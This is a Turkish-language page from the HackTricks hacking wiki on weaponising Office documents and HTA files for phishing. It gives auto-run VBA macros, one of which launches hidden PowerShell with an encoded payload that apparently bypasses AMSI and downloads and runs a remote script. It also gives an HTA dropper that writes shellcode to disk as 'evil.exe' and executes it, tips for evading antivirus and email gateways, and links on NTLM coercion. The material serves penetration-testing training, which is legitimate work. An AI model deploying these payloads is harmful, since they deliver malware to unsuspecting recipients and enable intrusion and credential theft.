# Phishing Dosyaları & Belgeleri

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## Ofis Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya veri doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına karşı veri yapısı tanımlaması şeklinde gerçekleştirilir. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmayacaktır.

Genellikle, makrolar içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve makro çalıştırma yeteneklerini korumak mümkündür.\
Örneğin, bir RTF dosyası tasarım gereği makroları desteklemez, ancak RTF olarak yeniden adlandırılan bir DOCM dosyası Microsoft Word tarafından işlenecek ve makro çalıştırma yeteneğine sahip olacaktır.\
Aynı iç yapılar ve mekanizmalar Microsoft Office Suite'in (Excel, PowerPoint vb.) tüm yazılımlarına uygulanır.

Aşağıdaki komutu kullanarak bazı Ofis programları tarafından hangi uzantıların çalıştırılacağını kontrol edebilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX dosyaları, makroları içeren uzaktan bir şablona atıfta bulunuyorsa (Dosya – Seçenekler – Eklentiler – Yönet: Şablonlar – Git) makroları "çalıştırabilir".

### Harici Resim Yükleme

Git: _Ekle --> Hızlı Parçalar --> Alan_\
&#xNAN;_**Kategoriler**: Bağlantılar ve Referanslar, **Alan adları**: includePicture, ve **Dosya adı veya URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (155).png>)

### Makrolar Arka Kapı

Makroları, belgeden rastgele kod çalıştırmak için kullanmak mümkündür.

#### Otomatik Yükleme Fonksiyonları

Ne kadar yaygın olurlarsa, antivirüsün bunları tespit etme olasılığı o kadar artar.

* AutoOpen()
* Document\_Open()

#### Makrolar Kod Örnekleri
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manuel olarak meta verileri kaldırma

**Dosya > Bilgi > Belgeyi Denetle > Belgeyi Denetle** yolunu izleyin, bu Belge Denetleyicisini açacaktır. **Denetle** butonuna tıklayın ve ardından **Belge Özellikleri ve Kişisel Bilgileri Kaldır** kısmının yanındaki **Tümünü Kaldır** butonuna tıklayın.

#### Doc Uzantısı

İşlem tamamlandığında, **Farklı Kaydet** türü açılır menüsünden, formatı **`.docx`**'den **Word 97-2003 `.doc`**'ye değiştirin.\
Bunu yapın çünkü **`.docx`** içinde makro kaydedemezsiniz ve makro etkin **`.docm`** uzantısı etrafında bir **stigma** vardır (örneğin, küçük resim simgesi büyük bir `!` içerir ve bazı web/e-posta geçitleri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşmadır**.

#### Kötü Amaçlı Makro Üreticileri

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Dosyaları

HTA, **HTML ve betik dilleri (VBScript ve JScript gibi)** birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir "tamamen güvenilir" uygulama olarak çalışır, bir tarayıcının güvenlik modelinin kısıtlamaları olmadan.

HTA, genellikle **Internet Explorer** ile birlikte **kurulan** **`mshta.exe`** kullanılarak çalıştırılır, bu da **`mshta`'nın IE'ye bağımlı** olduğu anlamına gelir. Eğer kaldırılmışsa, HTA'lar çalıştırılamayacaktır.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Kimlik Doğrulamasını Zorlamak

Kullanıcıların erişeceği e-postalara veya HTML'ye **görünmez resimler** ekleyerek, örneğin, **NTLM kimlik doğrulamasını "uzaktan" zorlamanın** birkaç yolu vardır (HTTP MitM bile?). Ya da kurbanı, sadece **klasörü açmak için** bir **kimlik doğrulaması tetikleyecek** **dosyaların adresiyle** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda kontrol edin:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM İletimi

Sadece hash veya kimlik doğrulamasını çalamayacağınızı, aynı zamanda **NTLM iletim saldırıları gerçekleştirebileceğinizi** unutmayın:

* [**NTLM İletim saldırıları**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM iletimi ile sertifikalar)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**

</details>
{% endhint %}
